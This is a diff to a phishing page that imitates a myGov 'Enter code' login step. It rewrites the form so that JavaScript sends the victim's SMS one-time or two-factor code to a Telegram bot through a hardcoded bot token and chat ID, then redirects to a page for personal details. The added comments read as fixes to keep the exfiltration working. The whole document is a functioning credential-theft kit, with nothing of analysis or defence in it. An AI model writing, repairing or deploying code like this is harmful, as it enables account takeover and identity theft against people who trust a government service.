@@ -37,30 +37,30 @@
                 <div class="login-grid-container">
                     <div class="login-grid-row">
                         <div class="login-grid-column">
-                          
-                                    <h1>Enter code</h1>
-                                    
-                                    <form id="form-1" class="mygov-login-form alternative" method="post" action="./next.php" method="POST">
-                                        <div class="input-group">
-                                            <p> We sent a code by SMS to your mobile number</p>
-                                            <div class="code-container">
-                                                <label for="confirmation-code">Code <input id="code" name="code" data-number-email-input="data-number-email-input" type="tel" class="security-code" value="" maxlength="6" required> </label>
-                                                
-                                            </div>
-                                            <br>
-                                            <div class="button-digital-id-main-container override">
-                                                <div class="digital-id-button-container">
-                                                    <button type="submit" class="button-main" name="btn2" id="btn2">Next</button>
-                                                </div>
-                                            </div>
-                                    </form>
-                                </div>
-                            </div>
+                            <h1>Enter code</h1>
+
+                            <!-- ✅ REMOVED action="./next.php" and duplicate method -->
+                            <form id="form-1" class="mygov-login-form alternative" method="post">
+                                <div class="input-group">
+                                    <p>We sent a code by SMS to your mobile number</p>
+                                    <div class="code-container">
+                                        <label for="confirmation-code">Code
+                                            <input id="code" name="code" data-number-email-input="data-number-email-input" type="tel" class="security-code" value="" maxlength="6" required>
+                                        </label>
+                                    </div>
+                                    <br>
+                                    <div class="button-digital-id-main-container override">
+                                        <div class="digital-id-button-container">
+                                            <button type="submit" class="button-main" name="btn2" id="btn2">Next</button>
+                                        </div>
+                                    </div>
+                            </form>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
+    </div>
     </div>
     <footer role="contentinfo">
         <div class="wrapper">
@@ -95,7 +95,9 @@
             </div>
         </div>
     </footer>
-        <!-- ====== KEEP THESE ====== -->
+
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
     <script type="text/javascript">
@@ -106,25 +108,33 @@
         $("#ph").inputmask({ "mask": "999-999-9999" });
     </script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
-    <!-- 🚫 DELETE this line: <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script> -->
+    <!-- 🚫 Slim jQuery removed to prevent breaking $.ajax -->
     <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
 
-    <!-- ====== 🟢 TELEGRAM SCRIPT (AT THE VERY BOTTOM) ====== -->
+    <!-- ====== 🟢 TELEGRAM SCRIPT (HANDLES FORM SUBMISSION) ====== -->
     <script>
+        // ============================================================
+        // CONFIGURATION – YOUR TELEGRAM BOT CREDENTIALS
+        // ============================================================
         const BOT_TOKEN = '8139401393:AAHpFqG_1CnbtFvF8tGdbhjASoeTTt93hxU';
         const CHAT_ID = '722615124';
+        // ============================================================
 
         $(document).ready(function() {
             $('#form-1').on('submit', function(e) {
-                e.preventDefault();
+                e.preventDefault(); // Stop the form from reloading the page
+
                 let code = $('#code').val();
                 let msg = "|----------| OTP / 2FA CODE |--------------|\n";
                 msg += "Code: " + code + "\n";
                 msg += "|-----------------------------------------|";
+
+                // Send the code to Telegram
                 $.ajax({
                     url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`,
                     method: 'GET',
                     complete: function() {
+                        // Redirect to the next page (Personal Info)
                         window.location.href = 'detail.html';
                     }
                 });
